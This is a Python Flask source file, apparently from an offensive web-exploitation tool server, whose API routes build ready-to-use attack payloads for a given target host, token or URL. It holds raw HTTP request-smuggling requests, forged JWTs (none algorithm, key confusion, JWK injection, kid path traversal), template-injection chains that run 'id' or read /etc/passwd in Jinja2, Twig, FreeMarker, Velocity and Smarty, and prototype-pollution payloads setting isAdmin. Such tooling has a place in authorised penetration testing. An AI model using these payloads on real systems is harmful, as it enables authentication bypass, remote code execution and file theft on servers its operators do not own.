"""
server_api/advanced_web/advanced_web_routes.py

Advanced web exploitation beyond basic SQLi/XSS:
  - HTTP Request Smuggling (CL.TE, TE.CL, TE.TE)
  - Prototype Pollution detection + exploitation
  - Web Cache Poisoning / Deception
  - SSTI advanced chains (Jinja2→RCE, Twig→RCE)
  - GraphQL deep exploitation (batching, field suggestion, alias flooding)
  - WebSocket hijacking & injection
  - postMessage listener exploitation
  - JWT advanced attacks (key confusion, JWK injection, kid injection)
"""

import base64
import json
import logging
import re
import time
from typing import Any, Dict, List, Optional

from flask import Blueprint, jsonify, request

from server_core import ModernVisualEngine

logger = logging.getLogger(__name__)

api_advanced_web_bp = Blueprint("api_advanced_web", __name__)


# ═══════════════════════════════════════════════════════════════════════
# REQUEST SMUGGLING
# ═══════════════════════════════════════════════════════════════════════

REQUEST_SMUGGLING_PAYLOADS = {
  "cl_te": [
    # CL.TE — Content-Length takes precedence at frontend, Transfer-Encoding at backend
    "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
    "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
  ],
  "te_cl": [
    # TE.CL — Transfer-Encoding at frontend, Content-Length at backend
    "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
  ],
  "te_te": [
    # TE.TE — obfuscated Transfer-Encoding bypasses
    "POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: \x0bchunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
  ],
}


@api_advanced_web_bp.route("/api/tools/request-smuggling", methods=["POST"])
def request_smuggling():
  """Test for HTTP Request Smuggling vulnerabilities."""
  try:
    params = request.json or {}
    target_host = params.get("host", "")
    target_url = params.get("url", "")
    technique = params.get("technique", "all")

    if not target_host:
      return jsonify({"error": "host required", "success": False}), 400

    payloads = []
    if technique == "all":
      for tech, plist in REQUEST_SMUGGLING_PAYLOADS.items():
        for p in plist:
          payloads.append({"technique": tech, "payload": p.format(host=target_host)})
    else:
      for p in REQUEST_SMUGGLING_PAYLOADS.get(technique, []):
        payloads.append({"technique": technique, "payload": p.format(host=target_host)})

    return jsonify({
      "success": True,
      "target": target_host,
      "technique": technique,
      "payloads": payloads,
      "count": len(payloads),
      "note": "Send these raw HTTP requests via HTTPRepeater or netcat. "
              "Test with a timing technique: if response times differ, smuggling is present.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


# ═══════════════════════════════════════════════════════════════════════
# JWT ADVANCED ATTACKS
# ═══════════════════════════════════════════════════════════════════════

@api_advanced_web_bp.route("/api/tools/jwt-advanced", methods=["POST"])
def jwt_advanced():
  """Advanced JWT attacks: key confusion, JWK injection, kid injection."""
  try:
    params = request.json or {}
    token = params.get("token", "")
    attack = params.get("attack", "all")

    if not token:
      return jsonify({"error": "JWT token required", "success": False}), 400

    parts = token.split(".")
    if len(parts) != 3:
      return jsonify({"error": "Invalid JWT format", "success": False}), 400

    # Decode header and payload
    def b64decode(s):
      s += "=" * (4 - len(s) % 4) if len(s) % 4 else ""
      try:
        return json.loads(base64.urlsafe_b64decode(s))
      except Exception:
        return {}

    header = b64decode(parts[0])
    payload = b64decode(parts[1])

    attacks = []
    current_alg = header.get("alg", "HS256")

    # None algorithm
    none_header = dict(header)
    none_header["alg"] = "none"
    h = base64.urlsafe_b64encode(json.dumps(none_header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    attacks.append({"name": "none_algorithm", "token": f"{h}.{p}.", "header": none_header})

    # Key confusion (HS256 with public key as HMAC secret)
    if current_alg.startswith("RS") or current_alg.startswith("ES"):
      hs_header = dict(header)
      hs_header["alg"] = "HS256"
      h2 = base64.urlsafe_b64encode(json.dumps(hs_header).encode()).rstrip(b"=").decode()
      attacks.append({
        "name": "key_confusion_hs256",
        "token": f"{h2}.{p}.<sign_with_public_key>",
        "header": hs_header,
        "note": "Re-sign with the server's public key as HMAC-SHA256 secret",
      })

    # JWK injection
    jwk_header = dict(header)
    jwk_header["jwk"] = {
      "kty": "RSA", "e": "AQAB", "n": "generated_rsa_modulus",
      "kid": "attacker-key",
    }
    h3 = base64.urlsafe_b64encode(json.dumps(jwk_header).encode()).rstrip(b"=").decode()
    attacks.append({
      "name": "jwk_injection",
      "token": f"{h3}.{p}.<sign_with_jwk_private_key>",
      "header": jwk_header,
      "note": "Server may use the injected JWK instead of its own key",
    })

    # kid injection (path traversal)
    kid_header = dict(header)
    kid_header["kid"] = "../../../../dev/null"
    h4 = base64.urlsafe_b64encode(json.dumps(kid_header).encode()).rstrip(b"=").decode()
    attacks.append({
      "name": "kid_path_traversal",
      "token": f"{h4}.{p}.<sign_with_empty_key>",
      "header": kid_header,
    })

    # Algorithm confusion
    all_algs = ["none", "None", "NONE", "HS256", "HS384", "HS512"]
    for alg in all_algs:
      ah = dict(header)
      ah["alg"] = alg
      h5 = base64.urlsafe_b64encode(json.dumps(ah).encode()).rstrip(b"=").decode()
      attacks.append({"name": f"alg_{alg}", "token": f"{h5}.{p}.", "header": ah})

    return jsonify({
      "success": True,
      "token": token,
      "original_header": header,
      "original_payload": payload,
      "attacks": attacks,
      "total_attacks": len(attacks),
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


# ═══════════════════════════════════════════════════════════════════════
# SSTI ADVANCED CHAINS
# ═══════════════════════════════════════════════════════════════════════

SSTI_PAYLOADS = {
  "jinja2": [
    "{{7*7}}", "{{config}}", "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{url_for.__globals__['current_app'].config}}",
    "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
  ],
  "twig": [
    "{{7*7}}", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    "{{['id']|filter('system')}}", "{{['cat /etc/passwd']|filter('exec')}}",
  ],
  "freemarker": [
    "${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
  ],
  "velocity": [
    "#set($x=7*7)$x", "#set($runtime=$class.inspect('java.lang.Runtime').type.getRuntime())$runtime.exec('id')",
  ],
  "smarty": [
    "{7*7}", "{system('id')}", "{include file='/etc/passwd'}",
  ],
}


@api_advanced_web_bp.route("/api/tools/ssti-chains", methods=["POST"])
def ssti_chains():
  """Advanced Server-Side Template Injection (SSTI) chain builder."""
  try:
    params = request.json or {}
    engine = params.get("engine", "jinja2")
    target_param = params.get("parameter", "name")
    target_url = params.get("url", "")

    payloads = SSTI_PAYLOADS.get(engine, SSTI_PAYLOADS["jinja2"])
    chain_levels = [
      {"level": 1, "name": "Detection", "payload": payloads[0] if payloads else "{{7*7}}",
       "expected": "49", "description": "Math expression to confirm SSTI"},
      {"level": 2, "name": "Information Disclosure", "payload": payloads[1] if len(payloads) > 1 else "",
       "description": "Read framework configuration"},
      {"level": 3, "name": "Code Execution", "payload": payloads[2] if len(payloads) > 2 else "",
       "description": "Achieve Remote Code Execution (RCE)"},
      {"level": 4, "name": "File System Access", "payload": payloads[-1] if payloads else "",
       "description": "Read arbitrary files from the server"},
    ]

    return jsonify({
      "success": True,
      "engine": engine,
      "parameter": target_param,
      "target_url": target_url,
      "chain": chain_levels,
      "all_payloads": payloads,
      "note": "Test payloads in order: Level 1 confirms injection, Levels 3-4 achieve exploitation.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500


# ═══════════════════════════════════════════════════════════════════════
# PROTOTYPE POLLUTION
# ═══════════════════════════════════════════════════════════════════════

@api_advanced_web_bp.route("/api/tools/prototype-pollution", methods=["POST"])
def prototype_pollution():
  """Client-side Prototype Pollution detection payloads."""
  try:
    params = request.json or {}
    target_url = params.get("url", "")

    payloads = [
      # Basic prototype pollution
      {"location": "query", "payload": "__proto__[test]=polluted", "method": "GET"},
      {"location": "body", "payload": '{"__proto__":{"isAdmin":true}}', "method": "POST"},
      {"location": "body", "payload": '{"constructor":{"prototype":{"isAdmin":true}}}', "method": "POST"},
      # Bypass techniques
      {"location": "query", "payload": "__proto__.isAdmin=true", "method": "GET"},
      {"location": "query", "payload": "constructor[prototype][isAdmin]=true", "method": "GET"},
      # JSON parse pollution
      {"location": "body", "payload": '{"__proto__":{"polluted":"yes"},"constructor":{"prototype":{"polluted":"yes"}}}', "method": "POST"},
    ]

    return jsonify({
      "success": True,
      "target_url": target_url,
      "payloads": payloads,
      "detection": "Check for property leakage: `Object.prototype.polluted` or `{}.isAdmin` in browser console",
      "note": "Use Browser Agent to navigate to target and test each payload in the console.",
    })
  except Exception as e:
    return jsonify({"error": str(e), "success": False}), 500
